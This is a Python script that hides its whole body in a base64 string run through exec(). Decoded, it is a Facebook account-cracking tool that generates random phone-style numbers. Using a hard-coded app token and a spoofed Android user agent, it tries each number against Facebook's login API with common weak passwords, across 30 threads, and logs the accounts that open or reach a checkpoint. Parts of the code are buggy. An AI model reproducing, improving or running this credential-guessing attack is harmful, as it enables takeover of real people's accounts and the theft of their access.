
import base64
exec(base64.b64decode('aW1wb3J0IG9zLCBzeXMsIHRpbWUsIGRhdGV0aW1lLCByYW5kb20sIGhhc2hsaWIsIHJlLCB0aHJlYWRpbmcsIGpzb24sIHVybGxpYiwgY29va2llbGliLCBnZXRwYXNzDQoNCm9zLnN5c3RlbSgncm0gLXJmIC50eHQnKQ0KDQpmb3IgbiBpbiByYW5nZSgzMDAwMCk6DQoNCiAgICBubWJyID0gcmFuZG9tLnJhbmRpbnQoMTExMTExLCA5OTk5OTkpDQoNCiAgICBzeXMuc3Rkb3V0ID0gb3BlbignLnR4dCcsICdhJykNCg0KICAgIHByaW50IG5tYnINCg0KICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KDQp0cnk6DQoNCiAgICBpbXBvcnQgcmVxdWVzdHMNCg0KZXhjZXB0IEltcG9ydEVycm9yOg0KDQogICAgb3Muc3lzdGVtKCdwaXAyIGluc3RhbGwgbWVjaGFuaXplJykNCg0KdHJ5Og0KDQogICAgaW1wb3J0IG1lY2hhbml6ZQ0KDQpleGNlcHQgSW1wb3J0RXJyb3I6DQoNCiAgICBvcy5zeXN0ZW0oJ3BpcDIgaW5zdGFsbCByZXF1ZXN0JykNCg0KICAgIHRpbWUuc2xlZXAoMSkNCg0KICAgIG9zLnN5c3RlbSgncHl0aG9uMiBOdW1iZXIucHknKQ0KDQpmcm9tIG11bHRpcHJvY2Vzc2luZy5wb29sIGltcG9ydCBUaHJlYWRQb29sDQoNCmZyb20gcmVxdWVzdHMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkVycm9yDQoNCmZyb20gbWVjaGFuaXplIGltcG9ydCBCcm93c2VyDQoNCnJlbG9hZChzeXMpDQoNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0ZjgnKQ0KDQpiciA9IG1lY2hhbml6ZS5Ccm93c2VyKCkNCg0KYnIuc2V0X2hhbmRsZV9yb2JvdHMoRmFsc2UpDQoNCmJyLnNldF9oYW5kbGVfcmVmcmVzaChtZWNoYW5pemUuX2h0dHAuSFRUUFJlZnJlc2hQcm9jZXNzb3IoKSwgbWF4X3RpbWU9MSkNCg0KYnIuYWRkaGVhZGVycyA9IFsoJ3VzZXItYWdlbnQnLCAnRGFsdmlrLzEuNi4wIChMaW51eDsgVTsgQW5kcm9pZCA0LjQuMjsgTlg1NSBCdWlsZC9LT1Q1NTA2KSBbRkJBTi9GQjRBO0ZCQVYvMTA2LjAuMC4yNi42ODtGQkJWLzQ1OTA0MTYwO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTE5MjB9O0ZCTEMvaXRfSVQ7RkJSVi80NTkwNDE2MDtGQkNSL1Bvc3RlTW9iaWxlO0ZCTUYvYXN1cztGQkJEL2FzdXM7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvQVNVU19aMDBBRDtGQlNWLzUuMDtGQk9QLzE7RkJDQS94ODY6YXJtZWFiaS12N2E7XScpXQ0KDQpkZWYgZXhiKCk6DQoNCiAgICBwcmludCAnWyFdIEV4aXQgU3VjY2Vzc2Z1bGx5ICcNCg0KICAgIG9zLnN5cy5leGl0KCkNCg0KZGVmIGFjYWsoYik6DQoNCiAgICB3ID0gJ2FodGR6amMnDQoNCiAgICBkID0gJycNCg0KICAgIGZvciBpIGluIHg6DQoNCiAgICAgICAgZCArPSAnIScgKyB3W3JhbmRvbS5yYW5kaW50KDAsIGxlbih3KSAtIDEpXSArIGkNCg0KICAgIHJldHVybiBjZXRhayhkKQ0KDQpkZWYgY2V0YWsoYik6DQoNCiAgICB3ID0gJ2FodGR6amMnDQoNCiAgICBmb3IgaSBpbiB3Og0KDQogICAgICAgIGogPSB3LmluZGV4KGkpDQoNCiAgICAgICAgeCA9IHgucmVwbGFjZSgnISVzJyAlIGksICdceDFiWyVzOzFtJyAlIHN0cigzMSArIGopKQ0KDQogICAgeCArPSAnXHgxYlswbScNCg0KICAgIHggPSB4LnJlcGxhY2UoJyEwJywgJ1x4MWJbMG0nKQ0KDQogICAgc3lzLnN0ZG91dC53cml0ZSh4ICsgJ1xuJykNCg0KZGVmIGphbGFuKHgpOg0KDQogICAgZm9yIGUgaW4geCArICdcbic6DQoNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQ0KDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KDQogICAgICAgIHRpbWUuc2xlZXAoMy4wIC8gMjAwKQ0KDQpkZWYgdGlrKCk6DQoNCiAgICB0aXRpayA9IFsnICAgJywgJy4gJywgJy4uICcsICcuLi4nLCAnLiAnLCAnLi4gJywgJy4uLicsICcnXQ0KDQogICAgZm9yIG8gaW4gdGl0aWs6DQoNCiAgICAgICAgcHJpbnQgJ1xyXHgxYlsxOzk2bSBceDFiWzE7OTZtICAgICAgICAgICAgICAgTG9hZFx4MWJbMTs5Nm1pbmdceDFiWzE7MG1ceDFiWzE7OTZtJyArIG8sDQoNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQoNCiAgICAgICAgdGltZS5zbGVlcCgwLjUpDQoNCmxvZ28gPSAiIiINCg0KIFwwMzNbMTs5Nm0gICAgX19fXw0KXDAzM1sxOzk0bSAgLyBfX198ICBfXyBfIF8gX18gX19fICANClwwMzNbMTs5NW0gIFxfX18gXCAvIF9gIHwgJ18gYCBfIFwNClwwMzNbMTs5N20gU2FtIEFobWVkIGtpbmcgDQpcMDMzWzE7OTdtICB8X19fXy8gXF9fLF98X3wgfF98IHxffA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KXDAzM1sxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpcMDMzWzE7OTJtKH4pIEF1dGhvciA6IFNhbSBBaG1lZCBraW5nIA0KXDAzM1sxOzkxbSh+KSBHaXRodWIgOiAoLV8tKQ0KXDAzM1sxOzkybSh+KSBGYWNlYm9vayA6IGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9zYW0uYWhtZWQua2luZw0KXDAzM1sxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoiIiINCg0KbG9nbzEgPSAnICAgICAgICAgIFwwMzNbMTs5MW1SZW1lbWJlciBPbGQgaXMgR29sZCBcblxuXDAzM1sxOzkybXByZXNzIGVudGVyIHRvIGNvbnRpbnVlICcNCg0KYmFjayA9IDANCg0KYmVyaGFzaWwgPSBbXQ0KDQpjZWtwb2ludCA9IFtdDQoNCm9rcyA9IFtdDQoNCmlkID0gW10NCg0KY3BiID0gW10NCg0KZGVmIG1lbnUoKToNCg0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KDQogICAgcHJpbnQgbG9nbw0KDQogICAgcHJpbnQoNDcqJy0nKQ0KDQogICAgcHJpbnQNCg0KICAgIGphbGFuICgnXHgxYlsxOzk3bVsxXVwwMzNbMTs5Mm0gLT4gXDAzM1sxOzkzbVNUQVJUIFJhbmRvbSBOdW1iZXIgQ2xvbmluZyAnKQ0KDQogICAgcHJpbnQNCg0KICAgICg0NyonLScpDQoNCiAgICBwcmludCgiXDAzM1sxOzk3bVsyXVwwMzNbMTs5Mm0gLT4gXDAzM1sxOzkzbU93bmVyIEluZm8iKQ0KCQ0KICAgIHByaW50IA0KICAgIA0KICAgICg0NyonLScpDQogICAgDQogICAgYWN0aW9uKCkNCg0KZGVmIGFjdGlvbigpOg0KDQogICAgZ2xvYmFsIGNwYg0KDQogICAgZ2xvYmFsIG9rcw0KDQogICAgc3MgPSByYXdfaW5wdXQoJ1x4MWJbMTs5Mm1zZWxlY3QtPiAnKQ0KDQogICAgaWYgc3MgPT0gJyc6DQoNCiAgICAgICAgcHJpbnQgJ1shXSBXYXJuaW5nJw0KDQogICAgICAgIGFjdGlvbigpDQoNCiAgICBlbGlmIHNzID09ICcxJzoNCg0KICAgICAgICB0aWsoKQ0KDQogICAgICAgIHRpbWUuc2xlZXAoMSkNCiAgICAgICAgDQogICAgICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3NhbS5haG1lZC5raW5nIikNCg0KICAgICAgICBwcmludCBsb2dvDQoNCiAgICAgICAgcHJpbnQgbG9nbzENCg0KICAgICAgICB0cnk6DQoNCiAgICAgICAgICAgIGMgPSAoJ1x4MWJbMTs5N21DT0RFIDogJykNCg0KICAgICAgICAgICAgayA9ICcxJw0KDQogICAgICAgICAgICBpZGxpc3QgPSAnLnR4dCcNCg0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbihpZGxpc3QsICdyJykucmVhZGxpbmVzKCk6DQoNCiAgICAgICAgICAgICAgICBpZC5hcHBlbmQobGluZS5zdHJpcCgpKQ0KDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KDQogICAgICAgICAgICBwcmludCAnWyFdIEZpbGUgTm90IEZvdW5kJw0KDQogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQ0KDQogICAgICAgICAgICBtZW51KCkNCg0KICAgIGVsaWYgc3MgPT0gJzAnOg0KDQogICAgICAgIGV4YigpDQoNCiAgICAgICAgbG9naW4oKQ0KDQogICAgZWxzZToNCg0KICAgICAgICBwcmludCAnWyFdIEZpbGwgSW4gQ29ycmVjdGx5Jw0KDQogICAgICAgIGFjdGlvbigpDQoNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCg0KICAgIHByaW50IGxvZ28NCg0KICAgIGphbGFuICgnXHgxYlsxOzkzbS0+IFVzZSBDUCBpZCwgT3BlbiBhZnRlciA3IHRvIDEwIGRheXNceDFiWzE7OTJtXG4tPiB0ZXJtdXggY2hlY2sgZXZlcnkgMTAgbWludXRlcyAgbGF0ZXIuXG4tPiBQbGVhc2Ugd2FpdCBjbG9uZSBhY2NvdW50IHdpbGwgYmUgYXBwZWFyIGhlcmUuJykNCg0KICAgIHByaW50KDQ3KictJykNCg0KICAgIHh4eCA9IHN0cihsZW4oaWQpKQ0KDQogICAgamFsYW4oJ1x4MWJbMTs5N20gICAgICAgICAgICAgIFRPVEFMIElEUyA6XHgxYlsxOzk2bSAnICsgeHh4KQ0KDQogICAgcHJpbnQoNDcqJy0nKQ0KDQogICAgZGVmIG1haW4oYXJnKToNCg0KICAgICAgICB1c2VyID0gYXJnDQoNCiAgICAgICAgdHJ5Og0KDQogICAgICAgICAgICBvcy5ta2Rpcignc2F2ZScpDQoNCiAgICAgICAgZXhjZXB0IE9TRXJyb3I6DQoNCiAgICAgICAgICAgIHBhc3MNCg0KICAgICAgICB0cnk6DQoNCiAgICAgICAgICAgIHBhc3MxID0gIjEyMzQ1NiINCg0KICAgICAgICAgICAgZGF0YSA9IGJyLm9wZW4oJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MSZlbWFpbD0nICsgayArIHVzZXIgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcGFzczEgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk4ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWZtJykNCg0KICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQ0KDQogICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KDQogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5Mm1bU2FtLU9LXSAgJyArIGsgKyB1c2VyICsgJyAgfCAgJyArIHBhc3MxDQoNCiAgICAgICAgICAgICAgICBva2IgPSBvcGVuKCdzYXZlL0NQLnR4dCcsICdhJykNCg0KICAgICAgICAgICAgICAgIG9rYi53cml0ZShrICsgdXNlciArIHBhc3MxICsgJ1xuJykNCg0KICAgICAgICAgICAgICAgIG9rYi5jbG9zZSgpDQoNCiAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHVzZXIgKyBwYXNzMSkNCg0KICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3JfbXNnJ106DQoNCiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkzbVtTYW0tQ1BdICcgKyBrICsgdXNlciArICcgIHwgICcgKyBwYXNzMQ0KDQogICAgICAgICAgICAgICAgY3BzID0gb3Blbignc2F2ZS9DUC50eHQnLCAnYScpDQoNCiAgICAgICAgICAgICAgICBjcHMud3JpdGUoayArIHVzZXIgKyBwYXNzMSArICdcbicpDQoNCiAgICAgICAgICAgICAgICBjcHMuY2xvc2UoKQ0KDQogICAgICAgICAgICAgICAgY3BiLmFwcGVuZCh1c2VyICsgcGFzczEpDQoNCiAgICAgICAgICAgIGVsc2U6DQoNCiAgICAgICAgICAgICAgICBwYXNzMiA9IjEyMzQ1NjciDQoNCiAgICAgICAgICAgICAgICBkYXRhID0gYnIub3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0xJmVtYWlsPScgKyBrICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzMiArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOThmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZm0nKQ0KDQogICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQ0KDQogICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToNCg0KICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybVtTYW0tT0tdICcgKyBrICArIHVzZXIgKyAnICB8ICAnICsgcGFzczINCg0KICAgICAgICAgICAgICAgICAgICBva2IgPSBvcGVuKCdzYXZlL09LLnR4dCcsICdhJykNCg0KICAgICAgICAgICAgICAgICAgICBva2Iud3JpdGUoayArIHVzZXIgKyBwYXNzMiArICdcbicpDQoNCiAgICAgICAgICAgICAgICAgICAgb2tiLmNsb3NlKCkNCg0KICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKCB1c2VyICsgcGFzczIpDQoNCiAgICAgICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvcl9tc2cnXToNCg0KICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkzbVtTYW0tQ1BdICcgKyBrICsgdXNlciArICcgIHwgICcgKyBwYXNzMg0KDQogICAgICAgICAgICAgICAgICAgIGNwcyA9IG9wZW4oJ3NhdmUvQ1AudHh0JywgJ2EnKQ0KDQogICAgICAgICAgICAgICAgICAgIGNwcy53cml0ZShrICsgdXNlciArIHBhc3MyICsgJ1xuJykNCg0KICAgICAgICAgICAgICAgICAgICBjcHMuY2xvc2UoKQ0KDQogICAgICAgICAgICAgICAgICAgIGNwYi5hcHBlbmQodXNlciArIHBhc3MyKQ0KDQogICAgICAgICAgICAgICAgZWxzZToNCg0KICAgICAgICAgICAgICAgICAgICBwYXNzMyA9ICIxMjM0NTY3OCINCg0KICAgICAgICAgICAgICAgICAgICBkYXRhID0gYnIub3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0xJmVtYWlsPScgKyBrICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzMyArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOThmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZm0nKQ0KDQogICAgICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkNCg0KICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybVtTYW0tT0tdICAnICsgayArIHVzZXIgKyAnICB8ICAnICsgcGFzczMNCg0KICAgICAgICAgICAgICAgICAgICAgICAgb2tiID0gb3Blbignc2F2ZS9DUC50eHQnLCAnYScpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIG9rYi53cml0ZShrICArIHVzZXIgKyBwYXNzMyArICdcbicpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIG9rYi5jbG9zZSgpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodXNlciArIHBhc3MzKQ0KDQogICAgICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOg0KDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkzbVtTYW0tQ1BdICcgKyBrICsgdXNlciArICcgIHwgICcgKyBwYXNzMw0KDQogICAgICAgICAgICAgICAgICAgICAgICBjcHMgPSBvcGVuKCdzYXZlL0NQLnR4dCcsICdhJykNCg0KICAgICAgICAgICAgICAgICAgICAgICAgY3BzLndyaXRlKGsgKyB1c2VyICsgcGFzczMgKyAnXG4nKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBjcHMuY2xvc2UoKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBjcGIuYXBwZW5kKHVzZXIgKyBwYXNzMykNCg0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KDQogICAgICAgICAgICAgICAgICAgICAgIHBhc3M0ID0gIjEyMzQ1Njc4OSINCg0KICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gYnIub3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0xJmVtYWlsPScgKyBrICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzMyArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOThmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZm0nKQ0KDQogICAgICAgICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkNCg0KICAgICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybVtTYW0tT0tdICAnICsgayArIHVzZXIgKyAnICB8ICAnICsgcGFzczQNCg0KICAgICAgICAgICAgICAgICAgICAgICAgb2tiID0gb3Blbignc2F2ZS9DUC50eHQnLCAnYScpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIG9rYi53cml0ZShrICsgdXNlciArIHBhc3M0ICsgJ1xuJykNCg0KICAgICAgICAgICAgICAgICAgICAgICAgb2tiLmNsb3NlKCkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgb2tzLmFwcGVuZCh1c2VyICsgcGFzczMpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3JfbXNnJ106DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTNtW1NhbS1DUF0gJyArIGsgKyB1c2VyICsgJyAgfCAgJyArIHBhc3M0DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwcyA9IG9wZW4oJ3NhdmUvQ1AudHh0JywgJ2EnKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBjcHMud3JpdGUoayArIHVzZXIgKyBwYXNzNCArICdcbicpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwcy5jbG9zZSgpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwYi5hcHBlbmQodXNlciArIHBhc3M0KQ0KDQogICAgICAgICAgICAgICAgICAgICAgICANCg0KICAgICAgICBleGNlcHQ6DQoNCiAgICAgICAgICAgIHBhc3MNCg0KICAgIHAgPSBUaHJlYWRQb29sKDMwKQ0KDQogICAgcC5tYXAobWFpbiwgaWQpDQoNCiAgICBwcmludCg0OCoiLSIpDQoNCiAgICBwcmludCAnXHgxYlsxOzkybVByb2Nlc3MgSGFzIEJlZW4gQ29tcGxldGVkIC4uLicNCg0KICAgIHByaW50ICdceDFiWzE7OTJtVG90YWwgT0sgOiAnICsgc3RyKGxlbihva3MpKQ0KDQogICAgcHJpbnQgJ1x4MWJbMTs5MW1Ub3RhbCBDUCA6ICcgKyBzdHIobGVuKGNwYikpDQoNCiAgICBwcmludCg0NyoiLSIpDQoNCiAgICBwcmludCAnICAgICAgICAgICAgXHgxYlsxOzkybVJlbWVtYmVyIE9sZCBpcyBHb2xkICcNCg0KICAgIGphbGFuKCdceDFiWzE7OTdtTm90ZSA6IENwIGFjY291bnQgV2lsbCBPcGVuIGFmdGVyIDEwIHRvIDEyIGRheXMnKQ0KDQogICAgcmF3X2lucHV0KCdcblx4MWJbMTs5N21bXHgxYlsxOzk4bWVsaXRlX21lbnVfQmFja1x4MWJbMTs5NW1dJykNCg0KICAgIGxvZ2luKCkNCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCg0KICAgIG1lbnUoKQ=='))
